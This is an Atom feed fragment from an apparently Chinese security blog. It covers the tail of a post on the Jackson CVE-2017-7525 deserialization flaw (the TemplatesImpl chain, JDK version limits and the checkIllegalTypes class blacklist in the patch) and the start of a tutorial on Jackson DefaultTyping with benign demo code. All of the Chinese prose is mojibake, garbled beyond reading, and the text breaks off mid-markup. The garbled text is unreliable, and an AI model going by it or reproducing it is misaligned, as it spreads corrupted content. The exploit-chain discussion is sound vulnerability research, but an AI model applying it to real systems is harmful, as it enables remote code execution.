href="#0x05-å…¶ä»–ç»†èŠ‚" class="headerlink" title="0x05 å…¶ä»–ç»†èŠ‚"></a>0x05 å…¶ä»–ç»†èŠ‚</h2><h3 id="é«˜ç‰ˆæœ¬-JDK-ä¸èƒ½è§¦å‘çš„åŸå› â€”â€”-tfactory"><a href="#é«˜ç‰ˆæœ¬-JDK-ä¸èƒ½è§¦å‘çš„åŸå› â€”â€”-tfactory" class="headerlink" title="é«˜ç‰ˆæœ¬ JDK ä¸èƒ½è§¦å‘çš„åŸå› â€”â€” _tfactory"></a>é«˜ç‰ˆæœ¬ JDK ä¸èƒ½è§¦å‘çš„åŸå› â€”â€” <code>_tfactory</code></h3><p>åœ¨å¤§ç‰ˆæœ¬ä¸‹ï¼ŒJDK1.7 å’Œ 1.8 ä¸­ï¼Œ<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> ç±»æ˜¯æœ‰æ‰€ä¸åŒçš„ã€‚</p><p>å½“ç„¶ï¼Œåœ¨å°ç‰ˆæœ¬è¾ƒé«˜çš„ 1.7 å’ŒæŸäº› 1.8 çš„è¿˜æ˜¯èƒ½å¤ŸæˆåŠŸè§¦å‘çš„ï¼Œå…·ä½“çš„å¯è‡ªè¡Œæµ‹è¯•ã€‚</p><p>åŒºåˆ«åœ¨äºæ–°å»º TransletClassLoader ç±»å®ä¾‹çš„ä»£ç ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>_factory</code> å±æ€§ï¼Œä½†æ˜¯è¯¥å±æ€§å€¼æˆ‘ä»¬æ²¡æœ‰åœ¨ PoC ä¸­è®¾ç½®ï¼Œé»˜è®¤ä¸º nullï¼Œäºæ˜¯å°±ä¼šæŠ›å‡ºå¼‚å¸¸äº†ã€‚</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/tfactory.png" class><p>è€Œ Jackson ä¹Ÿæ˜¯æ— æ³•è®¾ç½® <code>_tfactory</code> çš„ï¼Œå› ä¸º <code>_tfactory</code> åœ¨åŸæœ¬çš„ <code>TemplatesImpl</code> ç±»ä¸­éƒ½æ²¡æœ‰ getter æˆ– setter æ–¹æ³•ï¼Œè¿™å°±æ‹¿ä¸åˆ°äº†ã€‚</p><h2 id="0x06-è¡¥ä¸åˆ†æ"><a href="#0x06-è¡¥ä¸åˆ†æ" class="headerlink" title="0x06 è¡¥ä¸åˆ†æ"></a>0x06 è¡¥ä¸åˆ†æ</h2><p>è¿™é‡Œå°† jackson-databind-2.7.9 æ¢æˆ jackson-databind-2.7.9.1ã€‚<br>å°è¯•è¿è¡Œä¼šæŠ¥é”™å¦‚ä¸‹ï¼Œæ˜¾ç¤ºå› ä¸ºæŸäº›å®‰å…¨åŸå› ç¦æ­¢äº†è¯¥ç±»çš„åŠ è½½ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/fix.png" class><p>è°ƒè¯•åˆ†æï¼Œåœ¨è°ƒç”¨ <code>BeanDeserializerFactory.createBeanDeserializer()</code> å‡½æ•°åˆ›å»º Bean ååºåˆ—åŒ–å™¨çš„æ—¶å€™ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>checkIllegalTypes()</code> å‡½æ•°æå–å½“å‰ç±»åï¼Œç„¶åä½¿ç”¨é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/blackList.png" class><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/">http://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2017-7527 Jackson ååºåˆ—åŒ–</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson ååºåˆ—åŒ–ï¼ˆä¸€ï¼‰æ¼æ´åŸç†</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</id>
    <published>2023-12-07T12:05:52.000Z</published>
    <updated>2023-12-07T12:40:59.070Z</updated>
    
    <content type="html"><![CDATA[<p>è¿«åœ¨çœ‰ç«ï¼Œç”¨åˆ°çš„å¤ªå¤šäº†</p><h2 id="0x01-Jackson-åŸºæœ¬ä½¿ç”¨"><a href="#0x01-Jackson-åŸºæœ¬ä½¿ç”¨" class="headerlink" title="0x01 Jackson åŸºæœ¬ä½¿ç”¨"></a>0x01 Jackson åŸºæœ¬ä½¿ç”¨</h2><h3 id="Jackson-ç®€ä»‹"><a href="#Jackson-ç®€ä»‹" class="headerlink" title="Jackson ç®€ä»‹"></a>Jackson ç®€ä»‹</h3><p>Jackson æ˜¯ä¸€ä¸ªå¼€æºçš„Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å·¥å…·ï¼Œå¯ä»¥å°† Java å¯¹è±¡åºåˆ—åŒ–ä¸º XML æˆ– JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä»¥åŠå°† XML æˆ– JSON æ ¼å¼çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ã€‚</p><p>ç”±äºå…¶ä½¿ç”¨ç®€å•ï¼Œé€Ÿåº¦è¾ƒå¿«ï¼Œä¸”ä¸ä¾é é™¤ JDK å¤–çš„å…¶ä»–åº“ï¼Œè¢«ä¼—å¤šç”¨æˆ·æ‰€ä½¿ç”¨ã€‚</p><h3 id="ä½¿ç”¨-Jackson-è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#ä½¿ç”¨-Jackson-è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="ä½¿ç”¨ Jackson è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>ä½¿ç”¨ Jackson è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h3><p>ä½¿ç”¨çš„ Jackson åŒ…ç¯å¢ƒä¸º 2.7.9 ç‰ˆæœ¬</p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰ Person ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€ç¼–å†™ Jackson çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;Drunkbaby&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Drunkbaby&quot;&#125;</span></span><br><span class="line"><span class="comment">// Person.age=6, Person.name=Drunkbaby</span></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/JacksonTest.png" class><h2 id="0x02-Jackson-å¯¹äºå¤šæ€é—®é¢˜çš„è§£å†³-â€”â€”-JacksonPolymorphicDeserialization"><a href="#0x02-Jackson-å¯¹äºå¤šæ€é—®é¢˜çš„è§£å†³-â€”â€”-JacksonPolymorphicDeserialization" class="headerlink" title="0x02 Jackson å¯¹äºå¤šæ€é—®é¢˜çš„è§£å†³ â€”â€” JacksonPolymorphicDeserialization"></a>0x02 Jackson å¯¹äºå¤šæ€é—®é¢˜çš„è§£å†³ â€”â€” JacksonPolymorphicDeserialization</h2><p>ç®€å•åœ°è¯´ï¼ŒJava å¤šæ€å°±æ˜¯åŒä¸€ä¸ªæ¥å£ä½¿ç”¨ä¸åŒçš„å®ä¾‹è€Œæ‰§è¡Œä¸åŒçš„æ“ä½œã€‚</p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœå¯¹å¤šæ€ç±»çš„æŸä¸€ä¸ªå­ç±»å®ä¾‹åœ¨åºåˆ—åŒ–åå†è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå¦‚ä½•èƒ½å¤Ÿä¿è¯ååºåˆ—åŒ–å‡ºæ¥çš„å®ä¾‹å³æ˜¯æˆ‘ä»¬æƒ³è¦çš„é‚£ä¸ªç‰¹å®šå­ç±»çš„å®ä¾‹è€Œéå¤šæ€ç±»çš„å…¶ä»–å­ç±»å®ä¾‹å‘¢ï¼Ÿâ€”â€” Jackson å®ç°äº† JacksonPolymorphicDeserialization æœºåˆ¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p>JacksonPolymorphicDeserialization å³ Jackson å¤šæ€ç±»å‹çš„ååºåˆ—åŒ–ï¼šåœ¨ååºåˆ—åŒ–æŸä¸ªç±»å¯¹è±¡çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç±»çš„æˆå‘˜å˜é‡ä¸æ˜¯å…·ä½“ç±»å‹ï¼ˆnon-concreteï¼‰ï¼Œæ¯”å¦‚ Objectã€æ¥å£æˆ–æŠ½è±¡ç±»ï¼Œåˆ™å¯ä»¥åœ¨ JSON å­—ç¬¦ä¸²ä¸­æŒ‡å®šå…¶å…·ä½“ç±»å‹ï¼ŒJackson å°†ç”Ÿæˆå…·ä½“ç±»å‹çš„å®ä¾‹ã€‚</p><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯å°†å…·ä½“çš„å­ç±»ä¿¡æ¯ç»‘å®šåœ¨åºåˆ—åŒ–çš„å†…å®¹ä¸­ä»¥ä¾¿äºåç»­ååºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥å¾—åˆ°ç›®æ ‡å­ç±»å¯¹è±¡ï¼Œå…¶å®ç°æœ‰ä¸¤ç§ï¼Œå³ <code>DefaultTyping</code> å’Œ <code>@JsonTypeInfo</code> æ³¨è§£ã€‚è¿™é‡Œå’Œå‰é¢å­¦è¿‡çš„ fastjson æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚</p><p>ä¸‹é¢å…·ä½“ä»‹ç»ä¸€ä¸‹ã€‚</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson æä¾›ä¸€ä¸ª enableDefaultTyping è®¾ç½®ï¼Œå…¶åŒ…å« 4 ä¸ªå€¼ï¼ŒæŸ¥çœ‹ <code>jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java</code> å¯çœ‹åˆ°ç›¸å…³ä»‹ç»ä¿¡æ¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultTyping</span> &#123;  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * This value means that only properties that have  </span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including  </span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default  </span></span><br><span class="line"><span class="comment">        * typing.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       JAVA_LANG_OBJECT,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;  </span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).  </span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       OBJECT_AND_NON_CONCRETE,  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;  </span></span><br><span class="line"><span class="comment">        * plus all array types for them.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of  </span></span><br><span class="line"><span class="comment">        * &quot;natural&quot; types (String, Boolean, Integer, Double), which  </span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for  </span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_FINAL  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>é»˜è®¤æƒ…å†µä¸‹ï¼Œå³æ— å‚æ•°çš„ enableDefaultTyping æ˜¯ç¬¬äºŒä¸ªè®¾ç½®ï¼ŒOBJECT_AND_NON_CONCRETEã€‚</strong></p><p>ä¸‹é¢åˆ†åˆ«å¯¹è¿™å‡ ä¸ªé€‰é¡¹è¿›è¡Œè¯´æ˜ã€‚</p><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECTï¼šå½“è¢«åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–çš„ç±»é‡Œçš„å±æ€§è¢«å£°æ˜ä¸ºä¸€ä¸ª Object ç±»å‹æ—¶ï¼Œä¼šå¯¹è¯¥ Object ç±»å‹çš„å±æ€§è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”æ˜ç¡®è§„å®šç±»åã€‚ï¼ˆå½“ç„¶ï¼Œè¿™ä¸ª Object æœ¬èº«ä¹Ÿå¾—æ˜¯ä¸€ä¸ªå¯è¢«åºåˆ—åŒ–çš„ç±»ï¼‰</p><p>æ·»åŠ ä¸€ä¸ª Hacker ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">skill</span> <span class="operator">=</span> <span class="string">&quot;hiphop&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ Person ç±»ï¼Œæ·»åŠ  Object ç±»å‹å±æ€§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–°å»º <code>JAVA_LANG_OBJECTTest.java</code>ï¼Œæ·»åŠ  <code>enableDefaultTyping()</code> å¹¶è®¾ç½®ä¸º <code>JAVA_LANG_OBJECT</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVA_LANG_OBJECTTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// è®¾ç½®JAVA_LANG_OBJECT  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åŒæ ·å†™ä¸€ä¸ªç±»ï¼Œæ˜¯æ²¡æœ‰æ·»åŠ  <code>enableDefaultTyping()</code> çš„ï¼Œæ¥å¯¹æ¯”ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoJava_LANG_OBJECT</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/compare.png" class><p>è¾“å‡ºå¯¹æ¯”çœ‹åˆ°ï¼Œé€šè¿‡ enableDefaultTyping() è®¾ç½®è®¾ç½® JAVA_LANG_OBJECT åï¼Œä¼šå¤šè¾“å‡º Hacker ç±»åï¼Œä¸”åœ¨è¾“å‡ºçš„ Object å±æ€§æ—¶ç›´æ¥è¾“å‡ºçš„æ˜¯ Hacker ç±»å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´åŒæ—¶å¯¹ Object å±æ€§å¯¹è±¡è¿›è¡Œäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span 